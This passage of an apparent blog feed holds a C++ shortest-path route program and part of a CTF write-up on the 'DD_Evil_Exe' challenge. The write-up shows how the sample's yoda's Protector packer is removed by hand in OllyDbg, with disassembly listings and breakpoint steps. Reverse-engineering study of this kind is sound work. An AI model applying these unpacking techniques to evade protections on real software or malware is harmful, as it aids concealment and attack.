class="built_in">printf</span>(<span class="string">"3.Calculate the shortest route of all.(and store it in the disk)\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4.import the map from disk and output the shortest route between two locations.\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0.Quit.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Input_Map</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input names:\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"No.%d:"</span>, i);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, name[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">map</span>[i][j] = INF;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"From %s to %s (-1 stands for infinite):"</span>, name[i], name[j]);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">-1</span>) <span class="keyword">continue</span>;<span class="comment">//距离无限远 </span></span><br><span class="line"><span class="built_in">map</span>[i][j] = <span class="built_in">map</span>[j][i] = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">map</span>[i][i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_Id</span><span class="params">(<span class="keyword">char</span> str[])</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(name[i], str)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Dijkstra</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"> <span class="built_in">map</span>[i][i] = <span class="number">0</span>;<span class="comment">//要把所有的结点首先剔除S集合 </span></span><br><span class="line">    <span class="built_in">map</span>[s][s] = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;<span class="comment">//将s的邻接点加入dist </span></span><br><span class="line"> dist[i] = INF;</span><br><span class="line"> fa[i] = i;</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[s][i] &lt; INF)&#123;</span><br><span class="line"> dist[i] = <span class="built_in">map</span>[s][i];</span><br><span class="line"> fa[i] = s;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n<span class="number">-1</span>; i++)&#123;<span class="comment">//循环n-1次 </span></span><br><span class="line"> <span class="keyword">int</span> MIN = INF, u = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)&#123;<span class="comment">//在剩下的点中找一个与S集合邻接的，距离s点最短的点 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[j][j] == <span class="number">0</span> &amp;&amp; dist[j]&lt;MIN)&#123;</span><br><span class="line"> u = j;</span><br><span class="line"> MIN = dist[j];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">map</span>[u][u] = <span class="number">1</span>;<span class="comment">//加入这个点到S集合中 </span></span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[j][j] == <span class="number">0</span>)<span class="comment">//找到了u点，接下来把与u点邻接的所有边更新一下 </span></span><br><span class="line"> <span class="keyword">if</span>(<span class="built_in">map</span>[u][j] &lt; INF &amp;&amp; dist[u] + <span class="built_in">map</span>[u][j] &lt; dist[j])&#123;</span><br><span class="line"> dist[j] = dist[u] + <span class="built_in">map</span>[u][j];</span><br><span class="line"> fa[j] = u;<span class="comment">//把j的父亲设为u </span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> dist[t];<span class="comment">//返回距离 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Floyd</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">path[i][j] = j;<span class="comment">//初始化path数组 </span></span><br><span class="line"><span class="built_in">memcpy</span>(shortest, <span class="built_in">map</span>, <span class="keyword">sizeof</span>(<span class="built_in">map</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="keyword">if</span>(shortest[i][j] &gt; shortest[i][k] + shortest[k][j])&#123;</span><br><span class="line">shortest[i][j] = shortest[i][k] + shortest[k][j];</span><br><span class="line">path[i][j] = path[i][k];<span class="comment">//代表i到j的路径上，i的下一个结点为k </span></span><br><span class="line"><span class="comment">//重要 这段代码值得好好理解 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Print_Manu();</span><br><span class="line"><span class="keyword">int</span> Choice;</span><br><span class="line">FILE *f;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n\ninput optcode:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;Choice);</span><br><span class="line"><span class="keyword">switch</span>(Choice)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\ninput n:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">Input_Map(n);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Succeeded to import a map!\n\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input two names(separate with a space):\n"</span>);</span><br><span class="line"><span class="keyword">char</span> name1[<span class="number">20</span>], name2[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> s, t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s%s"</span>, name1, name2);</span><br><span class="line">s = Search_Id(name1);</span><br><span class="line">t = Search_Id(name2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s &lt; <span class="number">0</span> || t &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid name!\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">int</span> res = Dijkstra(s, t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The shortest distance is %d\n"</span>, res);</span><br><span class="line"><span class="keyword">if</span>(res == INF)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = t;</span><br><span class="line"><span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt; mystack;</span><br><span class="line"><span class="keyword">while</span>(k != s)&#123;</span><br><span class="line">mystack.push(k);</span><br><span class="line">k = fa[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>, name[s]);</span><br><span class="line"><span class="keyword">while</span>(mystack.empty() != <span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-&gt; %s "</span>, name[mystack.top()]);</span><br><span class="line">mystack.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:&#123;</span><br><span class="line">f = fopen(<span class="string">"AllPath.dat"</span>, <span class="string">"w"</span>);</span><br><span class="line">Floyd();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All the shortest distance:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d\n"</span>, n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%s "</span>, name[i]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = i+<span class="number">1</span>; j &lt;= n; j++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"from %s to %s: %d\n"</span>, name[i], name[j], shortest[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%s %s %d\n"</span>, name[i], name[j], shortest[i][j]);</span><br><span class="line"><span class="keyword">if</span>(shortest[i][j] == INF)<span class="comment">//没有路径 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = i;</span><br><span class="line"><span class="keyword">while</span>(k != j)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s -&gt;"</span>, name[k]);</span><br><span class="line">k = path[k][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s\n"</span>,name[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是记录两个节点的最短路径与之间的距离 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d "</span>, <span class="built_in">map</span>[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"%d "</span>, path[i][j]);</span><br><span class="line"><span class="built_in">fprintf</span>(f, <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(f);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:&#123;</span><br><span class="line"><span class="keyword">char</span> name1[<span class="number">20</span>], name2[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">f = fopen(<span class="string">"AllPath.dat"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d"</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%s"</span>, name[i]);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n*(n<span class="number">-1</span>)/<span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%s %s %d"</span>, name1, name2, &amp;t);</span><br><span class="line">shortest[Search_Id(name1)][Search_Id(name2)] = t;</span><br><span class="line">shortest[Search_Id(name2)][Search_Id(name1)] = t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下是读取两个节点的最短路径与之间的距离 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d "</span>, &amp;<span class="built_in">map</span>[i][j]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line"><span class="built_in">fscanf</span>(f, <span class="string">"%d "</span>, &amp;path[i][j]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"All the locations:\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s "</span>,name[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\ninput two locations:"</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s%s"</span>,name1,name2);</span><br><span class="line"><span class="keyword">int</span> u = Search_Id(name1);</span><br><span class="line"><span class="keyword">int</span> v = Search_Id(name2);</span><br><span class="line"><span class="keyword">if</span>(u==<span class="number">-1</span> || v==<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Invalid name!\n"</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"from %s to %s is %d\n"</span>, name1, name2, shortest[u][v]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(shortest[u][v]==INF)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"which means no path.\n"</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"path: "</span>);</span><br><span class="line"><span class="keyword">int</span> k = u;</span><br><span class="line"><span class="keyword">while</span>(k != v)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s -&gt;(%d)-&gt; "</span>, name[k], <span class="built_in">map</span>[k][path[k][v]]);</span><br><span class="line">k = path[k][v];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" %s\n"</span>,name[v]);</span><br><span class="line">&#125;</span><br><span class="line">fclose(f);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(Choice);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="project" scheme="https://mrh1s.top/categories/project/"/>
    
    
  </entry>
  
  <entry>
    <title>JarvisOJ_DD_Evil_Exe</title>
    <link href="https://mrh1s.top/posts/db7ddaa/"/>
    <id>https://mrh1s.top/posts/db7ddaa/</id>
    <published>2019-06-13T16:10:40.000Z</published>
    <updated>2019-06-17T08:57:53.191Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Evil-Exe-not-totallly-succeeded"><a href="#Evil-Exe-not-totallly-succeeded" class="headerlink" title="Evil_Exe(not totallly succeeded)"></a>Evil_Exe(not totallly succeeded)</h1><p> <a href="\uploads\DD_Evil_Exe.7z">DD_Evil_Exe.7z</a> </p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote><p> 程序双击打开后什么都没有发生，然后exe文件被删除了，取而代之的是一个docx文件</p></blockquote><p>用ida打开该文件，显示无法翻译，怀疑使用了壳进行加密</p><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>用peid去查询壳类型</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d0277534c24796706.png" alt="Snipaste_2019-06-14_00-18-08.png"></p><p>显示是yoda’s Protector，使用对应的脱壳器进行脱壳，失败</p><h3 id="去壳"><a href="#去壳" class="headerlink" title="去壳"></a>去壳</h3><p>用ollydbg手动去壳：</p><p>0x0043DCA8处是一个pushad，经过调试，程序会在此反复地pushad+popad地循环，所以直接设置eip至0x0043DCA2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC85 &gt; $  56            push esi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DC86   .  E8 00000000   call evil.0043DC8B</span><br><span class="line">0043DC8B   $  5E            pop esi                                  ;  kernel32.76B80419</span><br><span class="line">0043DC8C   .  B8 90110000   mov eax,0x1190</span><br><span class="line">0043DC91   .  81EE 8B8C0000 sub esi,0x8C8B</span><br><span class="line">0043DC97   &gt;  E8 0C000000   call evil.0043DCA8</span><br><span class="line">0043DC9C   .  83C6 08       add esi,0x8</span><br><span class="line">0043DC9F   .  48            dec eax</span><br><span class="line">0043DCA0   .^ 75 F5         jnz short evil.0043DC97</span><br><span class="line">0043DCA2   .  5E            pop esi                                  ;  kernel32.76B80419</span><br><span class="line">0043DCA3   .^ E9 08FEFFFF   jmp evil.0043DAB0</span><br><span class="line"></span><br><span class="line">0043DCA8  /$  60            pushad</span><br><span class="line">0043DCA9  |.  56            push esi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCAA  |.  AD            lods dword ptr ds:[esi]</span><br><span class="line">0043DCAB  |.  93            xchg eax,ebx</span><br><span class="line">0043DCAC  |.  AD            lods dword ptr ds:[esi]</span><br><span class="line">0043DCAD  |.  92            xchg eax,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCAE  |.  BF 74713414   mov edi,0x14347174</span><br><span class="line">0043DCB3  |.  BD 34443144   mov ebp,0x44314434</span><br><span class="line">0043DCB8  |.  B9 AC174798   mov ecx,0x984717AC</span><br><span class="line">0043DCBD  |.  BE 15DCE8AF   mov esi,0xAFE8DC15</span><br><span class="line">0043DCC2  |.  33C0          xor eax,eax</span><br><span class="line">0043DCC4  |&gt;  C1CB 08       /ror ebx,0x8</span><br><span class="line">0043DCC7  |.  03DA          |add ebx,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCC9  |.  33DF          |xor ebx,edi                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCCB  |.  C1C2 03       |rol edx,0x3</span><br><span class="line">0043DCCE  |.  33D3          |xor edx,ebx</span><br><span class="line">0043DCD0  |.  C1CD 08       |ror ebp,0x8</span><br><span class="line">0043DCD3  |.  03EF          |add ebp,edi                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCD5  |.  33E8          |xor ebp,eax</span><br><span class="line">0043DCD7  |.  C1C7 03       |rol edi,0x3</span><br><span class="line">0043DCDA  |.  33FD          |xor edi,ebp</span><br><span class="line">0043DCDC  |.  87F1          |xchg ecx,esi                            ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCDE  |.  87F5          |xchg ebp,esi                            ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCE0  |.  40            |inc eax</span><br><span class="line">0043DCE1  |.  3C 1B         |cmp al,0x1B</span><br><span class="line">0043DCE3  |.^ 75 DF         \jnz short evil.0043DCC4</span><br><span class="line">0043DCE5  |.  5F            pop edi                                  ;  kernel32.76B80419</span><br><span class="line">0043DCE6  |.  93            xchg eax,ebx</span><br><span class="line">0043DCE7  |.  AB            stos dword ptr es:[edi]</span><br><span class="line">0043DCE8  |.  92            xchg eax,edx                             ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DCE9  |.  AB            stos dword ptr es:[edi]</span><br><span class="line">0043DCEA  |.  61            popad</span><br><span class="line">0043DCEB  \.  C3            retn</span><br></pre></td></tr></table></figure><p>来到此处，又看到一个pushad，但是这个pushad后面的popad是找不到了，最好使用esp定律来寻找popad</p><p>按一下F8，并记录下esp的值 0x0019FF54</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DAB0   &gt; /60            pushad</span><br><span class="line">0043DAB1   . |BE 00504300   mov esi,evil.00435000</span><br><span class="line">0043DAB6   . |8DBE 00C0FCFF lea edi,dword ptr ds:[esi-0x34000]</span><br><span class="line">0043DABC   . |57            push edi                                 ;  evil.&lt;ModuleEntryPoint&gt;</span><br><span class="line">0043DABD   . |83CD FF       or ebp,-0x1</span><br><span class="line">0043DAC0   . |EB 10         jmp short evil.0043DAD2</span><br><span class="line">0043DAC2     |90            nop</span><br><span class="line">0043DAC3     |90            nop</span><br><span class="line">0043DAC4     |90            nop</span><br></pre></td></tr></table></figure><p>dd 0019FF54</p><p>设置硬件断点</p><p><a href="https://i.loli.net/2019/06/14/5d027ab23772f85550.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNz